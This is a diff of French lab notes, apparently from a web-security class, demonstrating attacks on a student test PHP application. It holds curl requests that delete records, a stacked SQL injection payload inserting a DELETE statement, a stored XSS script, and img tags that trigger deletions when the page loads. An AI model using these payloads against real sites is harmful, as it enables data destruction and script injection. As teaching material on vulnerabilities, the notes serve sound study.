@@ -20,15 +20,30 @@
 <body>
 <h1 id="test-injection-sql">test injection SQL</h1>
 <p>exemple de ce qu’il ne faut pas faire</p>
-<p><a href="https://blog.axe-net.fr/tuto-mysql-fulltext-in-boolean-mode/" class="uri">https://blog.axe-net.fr/tuto-mysql-fulltext-in-boolean-mode/</a></p>
-<p><a href="http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php" class="uri">http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php</a></p>
-<p>mysql –user=votreLogin –host=serveurmysql.iut-bm.univ-fcomte.fr –password=motDePasse –database=BDD_votreLogin</p>
+<p><a
+href="https://blog.axe-net.fr/tuto-mysql-fulltext-in-boolean-mode/"
+class="uri">https://blog.axe-net.fr/tuto-mysql-fulltext-in-boolean-mode/</a></p>
+<p><a
+href="http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php"
+class="uri">http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php</a></p>
+<p>mysql –user=votreLogin –host=serveurmysql.iut-bm.univ-fcomte.fr
+–password=motDePasse –database=BDD_votreLogin</p>
 <p>select * from produits;</p>
-<p>curl http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/6 curl http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/3 curl http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/2</p>
-<p>curl –data “typeProduit_id=2&amp;prix=3&amp;photo=photo” –data-urlencode “nom=essai’,2,‘3.1’,‘photo’); Delete from produits where id &gt; 3;” http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/validFormCreerProduit</p>
-curl –data “typeProduit_id=2&amp;prix=3.1&amp;photo=essai2.jpg” –data "nom=
+<p>curl
+http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/6
+curl
+http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/3
+curl
+http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/2</p>
+<p>curl –data “typeProduit_id=2&amp;prix=3&amp;photo=photo”
+–data-urlencode “nom=essai’,2,‘3.1’,‘photo’); Delete from produits where
+id &gt; 3;”
+http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/validFormCreerProduit</p>
+curl –data “typeProduit_id=2&amp;prix=3.1&amp;photo=essai2.jpg” –data
+“nom=
 <script>alert(\"hacked\")</script>
-<p>" http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/validFormCreerProduit</p>
+<p>”
+http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/validFormCreerProduit</p>
 <p><img src="http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/2"><img src="http://www-etu.iut-bm.univ-fcomte.fr/~amillet/S2_test_secu/app.php/Produit/supprimerProduit/1"></p>
 </body>
 </html>
